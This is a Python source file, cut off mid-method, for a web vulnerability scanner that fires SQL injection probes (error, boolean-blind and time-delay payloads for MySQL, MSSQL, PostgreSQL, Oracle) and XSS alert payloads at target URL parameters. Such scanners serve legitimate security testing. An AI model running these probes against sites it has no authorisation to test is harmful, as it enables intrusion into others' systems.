import time
import requests
import hashlib
import logging
import sys
import os
import re
import json
from urllib.parse import quote, unquote, urlparse, parse_qs, urljoin, urlunparse, urlencode
from bs4 import BeautifulSoup
import html as _html

# 导入模块（假设模块结构不变）
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from modules.request_manager import RateLimiter
    from modules.request_queue import RequestQueueManager
    from modules.request_sender import RequestSender
    from modules.request_builder import RequestBuilder
    from modules.response_parse import ResponseParse
    from utils import load_config, load_sqli_config, load_xss_payload,print_colored
    
    print("✅ 所有模块导入成功")
except ImportError as e:
    print(f"❌ 导入模块失败: {e}")
    print("请确保以下模块存在：")
    print("1. modules/request_manager.py")
    print("2. modules/request_queue.py")
    print("3. modules/request_sender.py")
    print("4. modules/request_builder.py")
    print("5. modules/response_parse.py")
    print("6. utils.py")
    sys.exit(1)

class sampilescanner:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/115.0"
        })
        
        # 获取日志记录器
        self.logger = logging.getLogger('vuln_scanner.scan.port')

        # 加载SQL注入配置文件
        self.sql_config = load_sqli_config()
        
        # 初始化速率限制器
        self.rate_limiter = RateLimiter(
            max_requests_per_second=self.config.get("max_requests_per_second", 20),
            max_requests_per_minute=self.config.get("max_requests_per_minute", 600)
        )
        
        # 初始化请求队列
        self.request_queue = RequestQueueManager(
            max_concurrent=self.config.get("max_concurrent_requests", 5),
            max_queue_size=self.config.get("max_queue_size", 100),
            rate_limiter=self.rate_limiter
        )
        
        # 初始化请求发送器
        self.request_sender = RequestSender(
            timeout=self.config.get("request_timeout", 10),
            verify_ssl=self.config.get("verify_ssl", False),
            user_agent=self.config.get("user_agent"),
            proxies=self.config.get("proxies"),
            max_retries=self.config.get("max_retries", 3)
        )

        # 初始化请求构造器和响应解析器
        self.request_builder = RequestBuilder()
        self.response_parser = ResponseParse()

        # XSS检测配置
        self.xss_payloads = load_xss_payload() if 'load_xss_payload' in globals() else self._get_default_xss_payloads()
        self.xss_indicators = [
            "<script>alert", "<script>confirm", "<script>prompt",
            "javascript:", "onerror=", "onload=", "onclick=", "onmouseover=",
            "<svg/onload=", "<img src=x onerror=", "<body onload=", "<iframe src="
        ]
        
        # 存储型XSS专用payloads
        self.stored_xss_payloads = self._get_stored_xss_payloads()
        
        # 存储型XSS检测状态
        self.stored_xss_test_results = {}
        self.stored_xss_checkpoints = []
        
        # 基准响应存储（用于布尔盲注对比）
        self.baseline_responses = {}
        
        # 预构建的SQL注入payload集合
        self.sql_payloads = self._build_sql_payloads()
        
        # 结果存储
        self.results = {
            "requests": [],
            "responses": [],
            "statistics": {},
            'vulnerabilities': [],
            'sql_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_type": {},
                "by_database": {},
                "by_method": {}
            }
        }
        
        # SQL注入检测阈值配置 - 降低阈值以提高检测率
        self.sql_thresholds = {
            "time_based_threshold": self.sql_config.get("time_based_threshold", 1.5),  # 降低到1.5秒
            "response_similarity_threshold": 0.65,  # 降低相似度阈值
            "length_variation_threshold": 0.2,  # 降低长度变化阈值
            "union_column_max": 10,  # 增加联合查询最大列数
            "boolean_confidence_min": 0.6  # 布尔盲注最小置信度
        }


    def _get_default_xss_payloads(self):
        """默认XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]

    def _get_stored_xss_payloads(self):
        """存储型XSS专用payloads - 包含追踪标识"""
        timestamp = int(time.time())
        marker = f"XSS_STORED_{timestamp}"
        
        return [
            f"<script>alert('{marker}_STORED')</script>",
            f"<img src=x onerror=alert('{marker}_STORED')>",
            f"<svg/onload=alert('{marker}_STORED')>",
            f"<body onload=alert('{marker}_STORED')>",
            f"javascript:alert('{marker}_STORED')",
            f"<iframe src=\"javascript:alert('{marker}_STORED')\">",
            f"' onmouseover=alert('{marker}_STORED') '",
            f"\" onfocus=alert('{marker}_STORED') \"",
            f"<a href=\"javascript:alert('{marker}_STORED')\">Link</a>",
            f"<div style=\"background-image:url(javascript:alert('{marker}_STORED'))\">",
            f"<input value=\"{marker}\" type=\"text\">"
        ]

    def _get_default_sql_config(self):
        """默认SQL注入配置"""
        return {
            "time_based_threshold": 3.0,
            "payloads": {
                "generic_error_based": ["'", "\"", "' OR '1'='1"],
                "mysql_specific": {
                    "error_based": ["' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --"],
                    "boolean_based": ["' AND 1=1 --"],
                    "time_based": ["' AND SLEEP(5) --"]
                }
            },
            "error_indicators": {
                "mysql": ["you have an error in your sql syntax", "warning: mysql"],
                "mssql": ["unclosed quotation mark", "sql server"],
                "postgresql": ["postgresql error"],
                "oracle": ["ora-"]
            },
            "boolean_indicators": {
                "true_indicators": ["welcome", "success", "exists"],
                "false_indicators": ["error", "invalid", "not found"]
            }
        }

    def _build_sql_payloads(self):
        """从配置文件构建SQL注入payload集合"""
        payloads = {
            "error_based": [],
            "boolean_based": [],
            "time_based": [],
            "union_based": [],
            "stacked": [],
            "oob": [],
            "comment_based": [],
            "second_order": []
        }
        
        config_payloads = self.sql_config.get("payloads", {})
        
        # 通用错误型payload
        if "generic_error_based" in config_payloads:
            for payload in config_payloads["generic_error_based"]:
                payloads["error_based"].append({"payload": payload, "database": "generic", "type": "error"})
        
        # 注释型payload
        if "comment_based" in config_payloads:
            for payload in config_payloads["comment_based"]:
                payloads["comment_based"].append({"payload": payload, "database": "generic", "type": "comment"})
        
        # DNS外带payload
        if "dns_exfiltration" in config_payloads:
            for payload in config_payloads["dns_exfiltration"]:
                payloads["oob"].append({"payload": payload, "database": "generic", "type": "oob"})
        
        # 数据库特定payload
        db_types = ["mysql_specific", "mssql_specific", "postgresql_specific", "oracle_specific"]
        
        for db_type in db_types:
            if db_type in config_payloads:
                db_name = db_type.replace("_specific", "")
                
                # 错误型payload
                if "error_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["error_based"]:
                        payloads["error_based"].append({"payload": payload, "database": db_name, "type": "error"})
                
                # 布尔型payload
                if "boolean_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["boolean_based"]:
                        payloads["boolean_based"].append({"payload": payload, "database": db_name, "type": "boolean"})
                
                # 时间型payload
                if "time_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["time_based"]:
                        payloads["time_based"].append({"payload": payload, "database": db_name, "type": "time"})
                
                # 联合查询payload
                if "union_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["union_based"]:
                        payloads["union_based"].append({"payload": payload, "database": db_name, "type": "union"})
                
                # 堆叠查询payload (MSSQL)
                if db_name == "mssql" and "stacked_queries" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["stacked_queries"]:
                        payloads["stacked"].append({"payload": payload, "database": db_name, "type": "stacked"})
                
                # 命令执行payload (MSSQL)
                if db_name == "mssql" and "command_execution" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["command_execution"]:
                        payloads["stacked"].append({"payload": payload, "database": db_name, "type": "command"})
        
        # 带外数据payload
        if "oob_out_of_band" in config_payloads:
            for payload in config_payloads["oob_out_of_band"]:
                payloads["oob"].append({"payload": payload, "database": "generic", "type": "oob"})
        
        # 二阶注入payload
        if "second_order_injection" in config_payloads:
            for payload in config_payloads["second_order_injection"]:
                payloads["second_order"].append({"payload": payload, "database": "generic", "type": "second_order"})
        
        # 混合payload
        if "hybrid_payloads" in config_payloads:
            for payload in config_payloads["hybrid_payloads"]:
                payloads["error_based"].append({"payload": payload, "database": "generic", "type": "hybrid"})
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _collect_statistics(self):
        """收集统计信息"""
        self.results['statistics'] = {
            'request_stats': self.request_sender.get_statistics() if hasattr(self.request_sender, 'get_statistics') else {},
            'queue_stats': self.request_queue.get_statistics() if hasattr(self.request_queue, 'get_statistics') else {},
            'rate_limit_stats': self.rate_limiter.get_stats() if hasattr(self.rate_limiter, 'get_stats') else {},
            'scan_duration': f"{time.time():.2f}s"
        }

    def parse_cookies(self,cookies_input):
        """
        将cookies字符串转换为字典
        支持格式：
        1. "name1=value1; name2=value2" (分号分隔)
        2. JSON格式: '{"name1": "value1", "name2": "value2"}'
        3. 已经是字典则直接返回
        将多种格式的Cookie输入转换为字典。
        支持：字典、字符串（分号分隔）、JSON字符串。
        """
        if not cookies_input:
            return {}

        # 1. 如果已经是字典，直接返回
        if isinstance(cookies_input, dict):
            return cookies_input.copy()  # 返回副本避免意外修改

        # 2. 如果是字符串
        if isinstance(cookies_input, str):
            cookies_input = cookies_input.strip()
            # 2.1 尝试解析为JSON（以{开头}）
            if cookies_input.startswith('{') and cookies_input.endswith('}'):
                try:
                    return json.loads(cookies_input)
                except json.JSONDecodeError:
                    pass  # 不是合法JSON，继续按字符串解析
                
            # 2.2 按分号分割的键值对解析
            cookies_dict = {}
            # 处理可能存在的'Cookie:'前缀
            if cookies_input.lower().startswith('cookie:'):
                cookies_input = cookies_input[7:].strip()

            pairs = cookies_input.split(';')
            for pair in pairs:
                pair = pair.strip()
                if not pair:  # 跳过空字符串
                    continue
                # 关键：使用 split('=', 1)，只分割第一个等号，确保值中的等号不被分割
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    cookies_dict[key.strip()] = value.strip()
                else:
                    # 对于没有等号的情况（虽然不符合标准，但有时会出现），将整个字符串作为键，值为空
                    cookies_dict[pair] = ''
            return cookies_dict
    
        # 3. 其他不支持的类型（如列表、元组）
        # 可以根据需要扩展，例如处理 [("name", "value")] 格式
        return {}

    def send_controlled_request(self, request_info):
        """发送受控制的请求"""
        cookies_str=self.config.get("cookies")
        cookies = self.parse_cookies(cookies_str)
        
        def _make_request():
            method = request_info.get('method', 'GET')
            url = request_info.get('url')

            if not url:
                raise ValueError("请求URL不能为空")

            # 发送请求
            response = self.request_sender.send_request(
                method=method,
                url=url,
                params=request_info.get('params'),
                data=request_info.get('data'),
                json_data=request_info.get('json'),
                headers=request_info.get('headers'),
                cookies=cookies,
                allow_redirects=request_info.get('allow_redirects', True)
            )
            
            # 确保响应文本是字符串
            response_text = response.text
            if not isinstance(response_text, str):
                if response_text is None:
                    response_text = ''
                else:
                    response_text = str(response_text)

            # 确保响应内容长度是整数
            content_length = len(response.content) if hasattr(response, 'content') else 0

            # 解析响应
            parsed_response = {}
            if hasattr(self.response_parser, 'parse_response'):
                try:
                    parsed_response = self.response_parser.parse_response(
                        response,
                        extract_links=True,
                        extract_forms=True,
                        base_url=url
                    )
                except Exception as e:
                    print(f"解析响应时出错: {e}")
                    parsed_response = {}

            return {
                'request': request_info,
                'response': {
                    'status_code': response.status_code if hasattr(response, 'status_code') else 0,
                    'url': str(response.url) if hasattr(response, 'url') else url,
                    'headers': dict(response.headers) if hasattr(response, 'headers') else {},
                    'text': response_text,
                    'content': response_text,
                    'content_length': content_length
                },
                'parsed': parsed_response
            }

        # 提交到队列
        task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"

        try:
            self.request_queue.submit(task_id, _make_request)
        except Exception as e:
            print(f"[ERROR] 提交任务失败: {e}")
            # 如果队列提交失败，尝试直接执行请求
            print("[INFO] 尝试直接执行请求...")
            try:
                result = _make_request()
                self._record_request_result(result)
                return result
            except Exception as e2:
                print(f"[ERROR] 直接请求也失败: {e2}")
                return None

        # 等待结果
        try:
            result = self.request_queue.get_result(task_id, timeout=30)

            # 记录结果
            self._record_request_result(result)

            return result

        except Exception as e:
            error_msg = f"请求失败: {request_info.get('url')} - {e}"
            if self.logger:
                self.logger.error(error_msg)
            else:
                print(error_msg)
            return None

    def _record_request_result(self, result):
        """记录请求结果"""
        if not result:
            return
        
        self.results['requests'].append(result['request'])
        self.results['responses'].append(result['response'])
        self._collect_statistics()

    # ==================== SQL注入检测增强方法 ====================
    
    def get_baseline_response(self, url, param_name, param_value, method, post_data):
        """获取基准响应"""
        baseline_key = f"{url}_{param_name}_{method}"

        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]

        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }

            if method.upper() == "GET":
                # 构建带参数的URL
                parsed_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = parsed_url
            else:
                # POST请求
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                # 安全地处理响应内容，确保是字符串
                response_data = response['response']
                content = response_data.get('content', '')
                content_length = response_data.get('content_length', 0)
                status_code = response_data.get('status_code', 0)
                headers = response_data.get('headers', {})

                # 确保content是字符串
                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                baseline = {
                    'content': content,
                    'length': content_length,
                    'status': status_code,
                    'time': 0,
                    'headers': headers,
                    'hash': hashlib.md5(content.encode()).hexdigest() if content else ''
                }

                self.baseline_responses[baseline_key] = baseline
                return baseline

        except Exception as e:
            print(f"获取基准响应失败: {e}")
            import traceback
            traceback.print_exc()

        return None

    def _build_url_with_param(self, url, param_name, value):
        """构建带参数的URL"""
        # 确保url是字符串
        if not isinstance(url, str):
            if isinstance(url, list):
                print(f"⚠️  _build_url_with_param: url参数是列表，使用第一个元素")
                url = url[0] if url else ""
            else:
                url = str(url)

        # 如果url为空，返回空字符串
        if not url:
            return ""

        try:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param_name] = [value]

            new_query = urlencode(query_dict, doseq=True)
            return parsed._replace(query=new_query).geturl()
        except Exception as e:
            print(f"❌ 构建URL参数失败: {e}")
            # 如果解析失败，尝试简单拼接
            if '?' in url:
                return f"{url}&{param_name}={value}"
            else:
                return f"{url}?{param_name}={value}"

    # ==================== 基于错误的注入检测 ====================
    def detect_error_based(self, url, param_name, param_value, method, post_data, baseline):
        """基于错误的SQL注入检测 - 使用配置文件payload"""
        # 确保url是字符串
        if not isinstance(url, str):
            if isinstance(url, list):
                url = url[0] if url else ""
            else:
                url = str(url)

        print(f"  [*] 开始错误注入检测，共 {len(self.sql_payloads.get('error_based', []))} 个payload")
        
        error_payloads = self.sql_payloads.get("error_based", [])
        
        # 先测试简单的payload快速验证
        quick_payloads = ["'", "\"", "' OR '1'='1", "1'", "1\""]
        
        for payload in quick_payloads:
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }

                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    if not test_url:
                        continue
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data

                response = self.send_controlled_request(request_info)

                if response and 'response' in response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content) if content is not None else ''

                    # 检查响应中是否包含数据库错误信息
                    error_found = self._check_for_database_errors(content)

                    if error_found:
                        db_type = self._identify_database_type(content)
                        return {
                            'type': 'Error-Based SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            'confidence': '高',
                            'evidence': error_found[:200],
                            'response_code': response['response'].get('status_code', 0),
                            'response_length': len(content),
                            'technique': 'Error message disclosure'
                        }

            except Exception as e:
                continue
        
        # 如果没有快速检测到，测试配置文件中的所有payload
        for payload_info in error_payloads:
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")

            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }

                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    if not test_url:
                        continue
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data

                response = self.send_controlled_request(request_info)

                if response and 'response' in response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content) if content is not None else ''

                    # 检查响应中是否包含数据库错误信息
                    error_found = self._check_for_database_errors(content)

                    if error_found:
                        db_type = self._identify_database_type(content)
                        return {
                            'type': 'Error-Based SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            'confidence': '高',
                            'evidence': error_found[:200],
                            'response_code': response['response'].get('status_code', 0),
                            'response_length': len(content),
                            'technique': 'Error message disclosure'
                        }

            except Exception as e:
                continue
            
        return None
    
    def _identify_database_type(self, response_text):
        """识别数据库类型"""
        if not isinstance(response_text, str):
            response_text = str(response_text)
        
        response_lower = response_text.lower()
        
        # MySQL
        mysql_patterns = ["mysql", "mysqli", "you have an error in your sql syntax"]
        for pattern in mysql_patterns:
            if pattern in response_lower:
                return "mysql"
        
        # SQL Server
        mssql_patterns = ["microsoft sql server", "odbc", "oledb", "sql server", "unclosed quotation mark"]
        for pattern in mssql_patterns:
            if pattern in response_lower:
                return "mssql"
        
        # Oracle
        oracle_patterns = ["ora-", "oracle", "pl/sql"]
        for pattern in oracle_patterns:
            if pattern in response_lower:
                return "oracle"
        
        # PostgreSQL
        postgres_patterns = ["postgresql", "pg_", "syntax error at or near"]
        for pattern in postgres_patterns:
            if pattern in response_lower:
                return "postgresql"
        
        # SQLite
        sqlite_patterns = ["sqlite", "sqlite3", "near.*syntax error"]
        for pattern in sqlite_patterns:
            if pattern in response_lower:
                return "sqlite"
        
        return "unknown"

    def _ensure_string_url(self, url_input):
        """确保URL是字符串类型"""
        if isinstance(url_input, str):
            return url_input
        elif isinstance(url_input, list):
            if url_input:
                return str(url_input[0])
            else:
                return ""
        elif url_input is None:
            return ""
        else:
            return str(url_input)

    def _check_for_database_errors(self, response_text):
        """
        检查响应中的数据库错误信息 - 多层递进式检测
        
        检测顺序：
        1. 配置文件中的错误指示器（最高优先级）
        2. 高置信度正则模式（常见SQL错误）
        3. 中等置信度正则模式（数据库特定错误）
        4. 返回None表示未检测到SQL错误
        """
        # 确保response_text是字符串
        if not isinstance(response_text, str):
            if response_text is None:
                response_text = ''
            else:
                response_text = str(response_text)
        
        if not response_text:
            return None
        
        # 限制检查范围（避免超大响应导致的性能问题）
        check_text = response_text[:10000] if len(response_text) > 10000 else response_text
        check_text_lower = check_text.lower()
        
        # 第一层：检查配置文件中的错误指示器
        error_indicators = self.sql_config.get("error_indicators", {})
        
        # 先检查特定数据库错误（更精准）
        db_types = ["mysql", "mssql", "postgresql", "oracle", "sqlite"]
        for db_type in db_types:
            if db_type in error_indicators:
                for indicator in error_indicators[db_type]:
                    if indicator.lower() in check_text_lower:
                        return f"{db_type.upper()} SQL Error: {indicator}"
        
        # 再检查通用错误指示器
        if "generic" in error_indicators:
            for indicator in error_indicators["generic"]:
                if indicator.lower() in check_text_lower:
                    return f"SQL Error: {indicator}"
        
        # 第二层：高置信度的通用SQL错误模式
        high_confidence_patterns = [
            # MySQL错误
            (r"SQL syntax.*MySQL", "MySQL Syntax Error"),
            (r"MySQLSyntaxErrorException", "MySQL Exception"),
            (r"\bSQL error\b", "SQL Syntax Error"),
            # PostgreSQL错误
            (r"PostgreSQL.*ERROR", "PostgreSQL Error"),
            (r"Syntax error.*relation", "PostgreSQL Relation Error"),
            # SQL Server错误
            (r"Msg \d+, Level \d+", "MSSQL Server Error"),
            (r"Microsoft OLE DB Provider", "MSSQL Provider Error"),
            # Oracle错误
            (r"ORA-\d{5}", "Oracle Error"),
            # 通用SQL语法错误
            (r"Unclosed quotation mark", "Unclosed Quote"),
            (r"Syntax error", "Syntax Error"),
            (r"unexpected end of input", "SQL Parse Error"),
        ]
        
        for pattern, error_type in high_confidence_patterns:
            match = re.search(pattern, check_text, re.IGNORECASE)
            if match:
                return f"{error_type}: {match.group(0)[:80]}"
        
        # 第三层：中等置信度模式（需要避免误报）
        medium_confidence_patterns = [
            # 警告信息（通常表示SQL错误）
            (r"Warning.*mysql_", "MySQL Warning"),
            (r"Warning.*pg_", "PostgreSQL Warning"),
            (r"Warning.*sqlite_", "SQLite Warning"),
            (r"Warning.*oci_", "Oracle Warning"),
            # 异常信息
            (r"Exception.*SQL", "SQL Exception"),
            (r"Error.*statement", "SQL Statement Error"),
            # 数据库特定错误
            (r"SQLite.*error", "SQLite Error"),
            (r"PostgreSQL query failed", "PostgreSQL Query Failed"),
            (r"valid\s+(?:MySQL|PostgreSQL)\s+result", "Database Result Error"),
        ]
        
        for pattern, error_type in medium_confidence_patterns:
            match = re.search(pattern, check_text, re.IGNORECASE)
            if match:
                return f"{error_type}: {match.group(0)[:80]}"
        
        return None

    # ==================== 布尔盲注检测 ====================
    def detect_boolean_based(self, url, param_name, param_value, method, post_data, baseline):
        """
        布尔盲注检测 - 使用智能真假条件识别
        
        核心原理：
        - 真条件（True）：应返回正常内容，与基准相似
        - 假条件（False）：应返回异常内容，与基准差异大
        - 基于多条件验证而非单一payload测试
        """
        if not baseline:
            return None
        
        print(f"  [*] 开始布尔盲注检测，基准响应长度: {baseline['length']}")
        
        boolean_payloads = self.sql_payloads.get("boolean_based", [])
        
        # 构建标准真假条件集合（更全面的识别方式）
        true_payloads = [
            "' AND '1'='1",
            "' AND 1=1",
            "' AND (1=1)",
            "' OR 1=1--",
            "\" AND \"1\"=\"1",
        ]
        false_payloads = [
            "' AND '1'='2",
            "' AND 1=2",
            "' AND (1=2)",
            "' OR 1=2--",
            "\" AND \"1\"=\"2",
        ]
        
        # 如果配置中有payload，优先使用
        if boolean_payloads:
            true_payloads = []
            false_payloads = []
            
            for payload_info in boolean_payloads:
                payload = payload_info.get("payload", "")
                payload_lower = payload.lower()
                
                # 更准确的真假判断逻辑
                is_true_condition = (
                    "1=1" in payload or 
                    "'1'='1" in payload or
                    '"1"="1"' in payload or
                    "'a'='a" in payload or
                    "true" in payload_lower or
                    ("and" in payload_lower and "1=1" in payload) or
                    ("or" in payload_lower and "1=1" in payload) or
                    payload.endswith("--") or  # SQL注释结尾通常是真条件
                    payload.endswith("#")
                )
                
                # 假条件特征：1=2, 'a'='b, false, and 1=2
                is_false_condition = (
                    "1=2" in payload or 
                    "'1'='2" in payload or
                    '"1"="2"' in payload or
                    "'a'='b" in payload or
                    "false" in payload_lower or
                    ("and" in payload_lower and "1=2" in payload) or
                    ("or" in payload_lower and "1=2" in payload)
                )
                
                if is_true_condition and not is_false_condition:
                    true_payloads.append(payload)
                elif is_false_condition and not is_true_condition:
                    false_payloads.append(payload)
        
        print(f"  [*] 真条件payload: {len(true_payloads)} 个，假条件payload: {len(false_payloads)} 个")
        
        # 多轮测试以确保结果准确
        true_responses = []
        false_responses = []
        
        # 测试真条件（最多3个payload）
        for i, payload in enumerate(true_payloads[:3]):
            print(f"  [>] 测试真条件 #{i+1}: {payload[:50]}...")
            true_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if true_response:
                true_responses.append(true_response)
        
        # 测试假条件（最多3个payload）
        for i, payload in enumerate(false_payloads[:3]):
            print(f"  [>] 测试假条件 #{i+1}: {payload[:50]}...")
            false_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if false_response:
                false_responses.append(false_response)
        
        # 需要至少各有1个响应来进行对比
        if not true_responses or not false_responses:
            print(f"  [-] 缺少真/假条件响应，无法进行布尔盲注分析")
            return None
        
        # 对所有响应进行统计分析
        true_similarities = []
        false_similarities = []
        
        for true_resp in true_responses:
            sim = self._calculate_similarity(baseline['content'], true_resp['content'])
            true_similarities.append(sim)
        
        for false_resp in false_responses:
            sim = self._calculate_similarity(baseline['content'], false_resp['content'])
            false_similarities.append(sim)
        
        # 计算平均相似度
        avg_true_sim = sum(true_similarities) / len(true_similarities) if true_similarities else 0
        avg_false_sim = sum(false_similarities) / len(false_similarities) if false_similarities else 0
        
        print(f"  [*] 真条件平均相似度: {avg_true_sim:.3f}")
        print(f"  [*] 假条件平均相似度: {avg_false_sim:.3f}")
        print(f"  [*] 相似度差异: {(avg_true_sim - avg_false_sim):.3f}")
        
        # 布尔盲注特征判断
        # 降低阈值以提高检测率
        true_matches_baseline = avg_true_sim > 0.6  # 从0.65降低到0.6
        false_differs_from_baseline = avg_false_sim < 0.7  # 从0.85降低到0.7
        difference_significant = (avg_true_sim - avg_false_sim) > 0.15  # 从0.2降低到0.15
        
        print(f"  [*] 真条件匹配基准: {true_matches_baseline}")
        print(f"  [*] 假条件与基准差异明显: {false_differs_from_baseline}")
        print(f"  [*] 差异显著: {difference_significant}")
        
        if true_matches_baseline and false_differs_from_baseline and difference_significant:
            # 进一步验证：检查内容长度差异
            avg_true_len = sum(r['length'] for r in true_responses) / len(true_responses)
            avg_false_len = sum(r['length'] for r in false_responses) / len(false_responses)
            
            length_diff_ratio = abs(avg_true_len - avg_false_len) / max(baseline['length'], 1)
            
            print(f"  [*] 长度差异比例: {length_diff_ratio:.3f}")
            
            # 降低长度差异要求
            if length_diff_ratio > 0.03 or avg_false_sim < 0.6:  # 从0.05降低到0.03
                return {
                    'type': 'Boolean-Based Blind SQL Injection',
                    'confidence': '中',
                    'evidence': {
                        'true_similarity': round(avg_true_sim, 3),
                        'false_similarity': round(avg_false_sim, 3),
                        'similarity_difference': round(avg_true_sim - avg_false_sim, 3),
                        'response_lengths': {
                            'baseline': baseline['length'],
                            'true_avg': int(avg_true_len),
                            'false_avg': int(avg_false_len)
                        },
                        'payloads_tested': len(true_payloads) + len(false_payloads)
                    },
                    'technique': 'Boolean condition differential analysis with multi-payload verification'
                }
        
        print(f"  [-] 未发现布尔盲注漏洞")
        return None

    def _test_boolean_condition(self, url, param_name, param_value, method, post_data, payload):
        """测试布尔条件"""
        try:
            test_value = f"{param_value}{payload}"
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }

            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, test_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = test_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                content = response['response'].get('content', '')
                # 确保content是字符串
                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                return {
                    'content': content,
                    'length': response['response'].get('content_length', 0),
                    'status': response['response'].get('status_code', 0)
                }

        except Exception:
            return None
    
    # ==================== 时间盲注检测 ====================
    def detect_time_based(self, url, param_name, param_value, method, post_data):
        """时间盲注检测 - 使用配置文件payload"""
        print(f"  [*] 开始时间盲注检测，阈值: {self.sql_thresholds['time_based_threshold']}秒")
        
        time_payloads = self.sql_payloads.get("time_based", [])
        
        if not time_payloads:
            # 如果没有配置的时间payload，使用默认的
            time_payloads = [
                {"payload": "' AND SLEEP(5)--", "database": "mysql"},
                {"payload": "' OR SLEEP(5)--", "database": "mysql"},
                {"payload": "' AND (SELECT pg_sleep(5))--", "database": "postgresql"},
                {"payload": "'; WAITFOR DELAY '00:00:05'--", "database": "mssql"},
                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--", "database": "oracle"}
            ]
        
        # 首先获取正常响应时间
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        print(f"  [*] 正常响应时间: {normal_time:.3f}秒")
        
        for payload_info in time_payloads[:8]:  # 增加测试payload数量
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            print(f"  [>] 测试时间payload: {payload[:50]}...")
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True,
                    'timeout': self.sql_thresholds['time_based_threshold'] + 10
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                elapsed_time = time.time() - start_time
                
                print(f"  [*] 延迟payload响应时间: {elapsed_time:.3f}秒")
                
                # 检查是否超时或明显延迟
                if elapsed_time > self.sql_thresholds['time_based_threshold']:
                    # 验证：发送不延迟的payload对比
                    no_delay_value = f"{param_value}' AND '1'='1"
                    no_delay_time = self._measure_response_time(
                        url, param_name, no_delay_value, method, post_data
                    )
                    
                    print(f"  [*] 无延迟payload响应时间: {no_delay_time:.3f}秒")
                    
                    # 降低延迟倍数要求
                    if elapsed_time > no_delay_time * 2:  # 从3倍降低到2倍
                        return {
                            'type': 'Time-Based Blind SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            'confidence': '中',
                            'evidence': {
                                'normal_response_time': round(normal_time, 3),
                                'delayed_response_time': round(elapsed_time, 3),
                                'threshold': self.sql_thresholds['time_based_threshold']
                            },
                            'technique': 'Time delay'
                        }
                        
            except Exception as e:
                # 超时也可能是时间盲注的特征
                error_str = str(e).lower()
                if "timeout" in error_str or "time out" in error_str or "timed out" in error_str:
                    return {
                        'type': 'Time-Based Blind SQL Injection (Timeout)',
                        'payload': payload,
                        'database': db_type,
                        'confidence': '中',
                        'evidence': f'Request timeout occurred: {error_str[:100]}',
                        'technique': 'Request timeout'
                    }
                continue
        
        print(f"  [-] 未发现时间盲注漏洞")
        return None

    def _measure_response_time(self, url, param_name, param_value, method, post_data):
        """测量响应时间"""
        try:
            start_time = time.time()
            
            request_info = {
                'method': method.upper(),
